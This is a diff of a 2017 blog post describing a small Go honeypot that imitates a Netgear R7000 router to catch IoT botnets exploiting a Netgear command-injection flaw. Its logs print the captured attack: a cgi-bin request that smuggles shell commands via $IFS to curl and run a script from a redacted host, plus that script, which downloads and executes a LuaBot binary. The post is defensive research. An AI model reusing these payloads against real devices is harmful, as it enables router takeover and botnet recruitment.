@@ -85,36 +85,36 @@ January 7, 2017
 <p>This happened to be a day or so after <a href=https://nakedsecurity.sophos.com/2016/12/12/netgear-routers-have-gaping-remote-access-hole/>the Netgear vulnerability affecting their consumer routers</a> was released to the public and gave me a question to answer - would the IoT botnet authors add support for this vulnerability to their bots?</p>
 <p>An important thing to realise about me: I’m incredibly lazy. I didn’t feel like learning to use complicated honeypotting tools or setting up a massive amount of infrastructure, just to answer a throwaway question I had on the weekend. So this presented another question: how could I fish for this malware as lazily as possible?</p>
 <p>So with a fine Cornish cider in hand I wrote possibly the crappiest emulation of a router ever. It’s a 21-line Go program that looks like so:</p>
-<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=font-weight:700>package</span> main
+<div class=highlight><pre tabindex=0 style=-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=color:green;font-weight:700>package</span> main
 
-<span style=font-weight:700>import</span> (
-    <span style=font-style:italic>&#34;net/http&#34;</span>
-    <span style=font-style:italic>&#34;log&#34;</span>
+<span style=color:green;font-weight:700>import</span> (
+    <span style=color:#ba2121>&#34;net/http&#34;</span>
+    <span style=color:#ba2121>&#34;log&#34;</span>
 )
 
-<span style=font-weight:700>func</span> HelloServer(w http.ResponseWriter, req *http.Request) {
-    log.Print(req)
-    w.Header().Set(<span style=font-style:italic>&#34;Content-Type&#34;</span>, <span style=font-style:italic>&#34;text/html&#34;</span>)
-    w.Header()[<span style=font-style:italic>&#34;WWW-Authenticate&#34;</span>] = []<span>string</span>{<span style=font-style:italic>&#34;Basic realm=\&#34;NETGEAR R7000\&#34;&#34;</span>}
-    w.WriteHeader(401)
+<span style=color:green;font-weight:700>func</span> <span style=color:#00f>HelloServer</span>(w http.ResponseWriter, req <span style=color:#666>*</span>http.Request) {
+    log.<span style=color:#00f>Print</span>(req)
+    w.<span style=color:#00f>Header</span>().<span style=color:#00f>Set</span>(<span style=color:#ba2121>&#34;Content-Type&#34;</span>, <span style=color:#ba2121>&#34;text/html&#34;</span>)
+    w.<span style=color:#00f>Header</span>()[<span style=color:#ba2121>&#34;WWW-Authenticate&#34;</span>] = []<span style=color:#b00040>string</span>{<span style=color:#ba2121>&#34;Basic realm=\&#34;NETGEAR R7000\&#34;&#34;</span>}
+    w.<span style=color:#00f>WriteHeader</span>(<span style=color:#666>401</span>)
 }
 
-<span style=font-weight:700>func</span> main() {
-    http.HandleFunc(<span style=font-style:italic>&#34;/&#34;</span>, HelloServer)
-    err := http.ListenAndServeTLS(<span style=font-style:italic>&#34;:8443&#34;</span>, <span style=font-style:italic>&#34;netgear.crt&#34;</span>, <span style=font-style:italic>&#34;netgear.key&#34;</span>, <span style=font-weight:700>nil</span>)
-    <span style=font-weight:700>if</span> err != <span style=font-weight:700>nil</span> {
-        log.Fatal(<span style=font-style:italic>&#34;ListenAndServe: &#34;</span>, err)
+<span style=color:green;font-weight:700>func</span> <span style=color:#00f>main</span>() {
+    http.<span style=color:#00f>HandleFunc</span>(<span style=color:#ba2121>&#34;/&#34;</span>, HelloServer)
+    err <span style=color:#666>:=</span> http.<span style=color:#00f>ListenAndServeTLS</span>(<span style=color:#ba2121>&#34;:8443&#34;</span>, <span style=color:#ba2121>&#34;netgear.crt&#34;</span>, <span style=color:#ba2121>&#34;netgear.key&#34;</span>, <span style=color:green;font-weight:700>nil</span>)
+    <span style=color:green;font-weight:700>if</span> err <span style=color:#666>!=</span> <span style=color:green;font-weight:700>nil</span> {
+        log.<span style=color:#00f>Fatal</span>(<span style=color:#ba2121>&#34;ListenAndServe: &#34;</span>, err)
     }
 }
 </code></pre></div><p>It listens on port 8443, like the real device, and looks on the surface about as much like the device as I could be bothered to make it look. It’s definitely not perfect! The headers are returned in the wrong order, it returns some headers the real device doesn’t, because Go’s net/http package added them and I was too lazy to work out how to remove them, the SSL certificate is just a self signed one I made with the same fields as the real Netgear certificate, and so on.</p>
 <p>But I figured it might be good enough to fool an automated scanner, which is probably just looking for a string somewhere. And I was right!</p>
 <p>I deployed this to a DigitalOcean VM that I had lying around, and then, because this device would usually be running on consumer/office ISP’s and not datacentres, had a few kind friends forward incoming traffic to their IP’s on port 8443 to my new VM.</p>
 <p>A day or two later, something bit:</p>
-<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>2016/12/13 12:17:54 &amp;{GET / HTTP/1.1 1 1 map[Connection:[close] User-Agent:[Scanbot]] 0x8762b0 0 [] false REDACTED map[] map[] &lt;nil&gt; map[] REDACTED:52268 / 0xc21006fa80}
+<div class=highlight><pre tabindex=0 style=-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>2016/12/13 12:17:54 &amp;{GET / HTTP/1.1 1 1 map[Connection:[close] User-Agent:[Scanbot]] 0x8762b0 0 [] false REDACTED map[] map[] &lt;nil&gt; map[] REDACTED:52268 / 0xc21006fa80}
 2016/12/13 12:17:55 &amp;{GET /cgi-bin/;cd$IFS%22var%22;curl$IFS%22REDACTED:7778%22$IFS%22-o%22$IFS%22nya.sh%22;sh$IFS%22nya.sh%22 HTTP/1.1 1 1 map[Connection:[close] User-Agent:[Scanbot]] 0x8762b0 0 [] false REDACTED map[] map[] &lt;nil&gt; map[] REDACTED:54482 /cgi-bin/;cd$IFS&#34;var&#34;;curl$IFS&#34;REDACTED:7778&#34;$IFS&#34;-o&#34;$IFS&#34;nya.sh&#34;;sh$IFS&#34;nya.sh&#34; 0xc2100af660}
 </code></pre></div><p>As you can see, the output is disgusting - because I just dumped Go’s object straight to the log. Lazy, remember.</p>
 <p>But, we clearly have evidence here of something hitting us to determine if we are a Netgear and then attempting to exploit the vulnerability. Let’s take a look at the script:</p>
-<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>curl http://REDACTED/arm_lsb &gt; /var/nya
+<div class=highlight><pre tabindex=0 style=-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>curl http://REDACTED/arm_lsb &gt; /var/nya
 chmod 777 /var/nya
 /var/nya
 </code></pre></div><p>Yep, looks like some kind of IoT malware to me. And it was - if you’re interested, it turns out to be LuaBot, as described previously <a href=http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html>here</a>.</p>
